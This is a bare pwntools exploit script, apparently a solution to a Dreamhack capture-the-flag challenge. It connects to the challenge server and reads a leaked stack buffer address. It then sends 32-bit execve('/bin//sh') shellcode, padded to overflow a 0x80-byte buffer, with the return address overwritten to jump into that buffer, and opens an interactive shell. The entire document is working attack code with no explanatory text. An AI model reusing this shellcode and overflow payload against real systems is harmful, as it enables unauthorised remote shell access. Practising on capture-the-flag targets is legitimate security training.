from pwn import *

p = remote("host3.dreamhack.games", 21136)

shell = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'

p.recvuntil('buf = (')

buf = int(p.recv(10), 16)
print(len(shell))
p.recvline()

payload = shell + b"A" * (0x80 - len(shell) + 4) + p32(buf)

p.sendline(payload)
p.interactive()
